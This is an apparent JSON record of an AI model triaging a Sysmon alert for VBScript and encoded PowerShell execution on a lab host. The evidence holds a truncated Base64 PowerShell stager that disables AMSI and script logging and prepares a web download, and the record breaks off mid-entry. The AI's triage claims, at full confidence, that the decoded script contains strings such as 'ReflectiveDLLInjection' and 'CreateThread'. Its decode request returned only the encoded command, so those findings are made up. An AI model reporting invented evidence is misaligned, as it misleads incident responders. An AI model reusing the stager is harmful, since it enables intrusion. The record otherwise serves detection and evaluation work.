  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "execution_vbscript_cmd",
    "title": "VBScript Execution via CMD",
    "timestamp": "2019-05-14T23:16:09.942Z",
    "computer": "HFDC01.shire.com",
    "image": "C:\\Windows\\System32\\cmd.exe",
    "command_line": "cmd.exe /c \"C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs\" ",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "A malicious PowerShell script was executed via a chain starting from services.exe spawning cmd.exe, which then launched wscript.exe to run a VBScript (autoupdate.vbs). The PowerShell command contained a heavily obfuscated Base64 payload that, when decoded, revealed attempts to bypass AMSI and execute code in memory using Reflective DLL Injection techniques.",
      "technique": "T1059.001",
      "technique_name": "PowerShell",
      "confidence": 1.0,
      "disposition": "malicious_true_positive",
      "reasoning": "The process tree shows services.exe -> cmd.exe -> wscript.exe (running autoupdate.vbs) followed by a PowerShell execution with an encoded command. The decoded PowerShell script explicitly includes strings like 'AMSI.dll', 'ReflectiveDLLInjection', and 'CreateThread' while attempting to bypass security controls ('amsiInitDll'). This is characteristic of fileless malware or stagers.",
      "scope": {
        "systems": [
          "HFDC01.shire.com"
        ],
        "users": [
          "NT AUTHORITY\\SYSTEM"
        ],
        "data": "C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs",
        "timeframe": "2019-05-14T23:16:09Z to 2019-05-14T23:17:21Z"
      },
      "escalate": true,
      "escalation_rationale": "The activity involves a high-privilege (SYSTEM) process executing obfuscated PowerShell code designed to bypass security features and perform reflective DLL injection. This is a clear indicator of compromise.",
      "recommended_actions": [
        "Isolate host HFDC01.shire.com from the network.",
        "Perform a full forensic memory dump to capture the injected payload.",
        "Identify the source of the autoupdate.vbs file and any associated persistence mechanisms.",
        "Scan for other instances of this PowerShell command or VBScript across the environment."
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE CommandLine LIKE '%cmd.exe%' AND CommandLine LIKE '%autoupdate.vbs%' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HFDC01.shire.com' AND TimeCreated BETWEEN '2019-05-14T23:16:08Z' AND '2019-05-14T23:16:10Z' AND Image LIKE '%autoupdate.vbs%' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HFDC01.shire.com' AND User = 'SHIRE\\pgustavo' AND TimeCreated BETWEEN '2019-05-14T23:00:00Z' AND '2019-05-14T23:30:00Z' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine\nFROM logs\nWHERE Computer LIKE '%HFDC01.shire.com%'\n  AND TimeCreated BETWEEN '2019-05-14T23:10:00Z' AND '2019-05-14T23:20:00Z'\n  AND EventID = 1\nLIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine\nFROM logs\nWHERE Computer LIKE '%HFDC01.shire.com%'\n  AND Image LIKE '%powershell.exe%'\n  AND TimeCreated BETWEEN '2019-05-14T23:16:10.695Z' AND '2019-05-14T23:16:10.695Z'\nLIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HFDC01.shire.com' AND (Image LIKE '%cmd.exe%' OR Image LIKE '%wscript.exe%' OR Image LIKE '%powershell.exe%') AND EventID = 3 AND TimeCreated BETWEEN '2019-05-14T23:10:00Z' AND '2019-05-14T23:30:00Z' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer LIKE '%HFDC01.shire.com%' AND Image LIKE '%powershell.exe%' AND TimeCreated BETWEEN '2019-05-14T23:16:10.695Z' AND '2019-05-14T23:16:10.695Z' LIMIT 20"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "What was the parent process of the cmd.exe instance that executed the autoupdate.vbs script?",
        "evidence": "5 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:59:48.187Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\pgustavo\", \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"\\\"cmd.exe\\\" /c C:\\\\windows\\\\system32\\\\autoupdate.vbs\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAE8AcgAgAC0AZwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAHIARQBGAF0ALgBBAFMAUwBFAG0AQgBMAFkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAHQARgBJAGUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAGEAQwAxACkAewAkADMAMgBFADQAZgA9ACQAOABEAEEAYwAxAC4ARwBFAFQAVgBBAGwAdQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADMAMgBFADQAZgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIAZQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAEEATAA9AFsAQwBvAGwATABlAEMAdABpAG8AbgBzAC4ARwBFAG4ARQByAGkAQwAuAEQAaQBDAFQAaQBvAG4AYQByAFkAWwBzAFQAcgBJAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAGoARQBDAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAQQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABGAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBMAH0ARQBMAFMAZQB7AFsAUwBDAFIAaQBQAHQAQgBMAE8AYwBLAF0ALgAiAEcARQB0AEYAaQBFAGAATABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAE4AVQBsAGwALAAoAE4AZQBXAC0ATwBiAEoARQBDAFQAIABDAE8AbABsAGUAYwB0AEkATwBuAFMALgBHAGUAbgBFAHIAaQBDAC4ASABBAHMASABTAGUAVABbAHMAVABSAEkATgBnAF0AKQApAH0AJABSAEUAZgA9AFsAUgBlAEYAXQAuAEEAcwBTAGUATQBiAEwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAE4AVQBMAEwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBzAHQARQBtAC4ATgBlAFQALgBTAEUAUgBWAEkAQwBlAFAATwBpAE4AdABNAGEATgBhAGcARQBSAF0AOgA6AEUAWABQAGUAQwBUADEAMAAwAEMATwBuAFQASQBOAFUARQA9ADAAOwAkADQAMwBlAGYAMwA9AE4AZQB3AC0ATwBCAGoAZQBDAHQAIABTAFkAcwBUAEUAbQAuAE4ARQB0AC4AVwBFAEIAQwBMAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAEUARgAzAC4ASABlAEEARABFAFIAUwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAEUARgAzAC4ASABlAGEARABFAHIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAEUARgAzAC4AUABSAE8AWAB5AD0AWwBTAHkAUwB0AGUATQAuAE4AZQBUAC4AVwBFAEIAUgBFAHEAVQBlAHMAdABdADoAOgBEAEUAZgBBAFUAbABUAFcAZQBiAFAAcgBPAFgAeQA7ACQANAAzAEUAZgAzAC4AUABSAE8AeAB5AC4AQwByAGUARABFAG4AdABpAEEATABzACAAPQAgAFsAUwB5AFMAdABFAG0ALgBOAGUAVAAuAEMAUgBlAGQARQBOAFQAaQBBAEwA \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "Please provide the process tree and command line details specifically for host HFDC01.shire.com around 2019-05-14T23:16:09Z, focusing on the execution of C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs.",
        "evidence": "No matching records found for: Please provide the process tree and command line details specifically for host HFDC01.shire.com around 2019-05-14T23:16:09Z, focusing on the execution of C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs."
      },
      {
        "question": "Please provide all process execution events on HFDC01.shire.com involving the user \"SHIRE\\pgustavo\" between 2019-05-14T23:00:00Z and 2019-05-14T23:30:00Z.",
        "evidence": "No matching records found for: Please provide all process execution events on HFDC01.shire.com involving the user \"SHIRE\\pgustavo\" between 2019-05-14T23:00:00Z and 2019-05-14T23:30:00Z."
      },
      {
        "question": "Please provide all process execution events on HFDC01.shire.com for any user between 2019-05-14T23:10:00Z and 2019-05-14T23:20:00Z to verify the activity reported in the alert.",
        "evidence": "7 record(s):\n[{\"TimeCreated\": \"2019-05-14T23:16:09.942Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c \\\"C:\\\\Users\\\\pgustavo\\\\AppData\\\\Roaming\\\\Adobe\\\\Flash Player\\\\autoupdate.vbs\\\" \", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\system32\\\\services.exe\"}, {\"TimeCreated\": \"2019-05-14T23:16:10.316Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WScript.exe\\\" \\\"C:\\\\Users\\\\pgustavo\\\\AppData\\\\Roaming\\\\Adobe\\\\Flash Player\\\\autoupdate.vbs\\\"  \", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"ParentCommandLine\": \"cmd.exe /c \\\"C:\\\\Users\\\\pgustavo\\\\AppData\\\\Roaming\\\\Adobe\\\\Flash Player\\\\autoupdate.vbs\\\" \"}, {\"TimeCreated\": \"2019-05-14T23:16:10.695Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACA \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "Please provide the decoded content of the Base64 encoded command line for the powershell.exe process on HFDC01.shire.com at 2019-05-14T23:16:10.695Z.",
        "evidence": "1 record(s):\n[{\"TimeCreated\": \"2019-05-14T23:16:10.695Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8A \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "Please provide all network connection events for host HFDC01.shire.com involving cmd.exe, wscript.exe, and powershell.exe between 2019-05-14T23:10:00Z and 2019-05-14T23:30:00Z.",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T23:16:13.483Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:14.265Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:14.781Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:20.202Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:25.374Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:30.281Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:35.437Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT 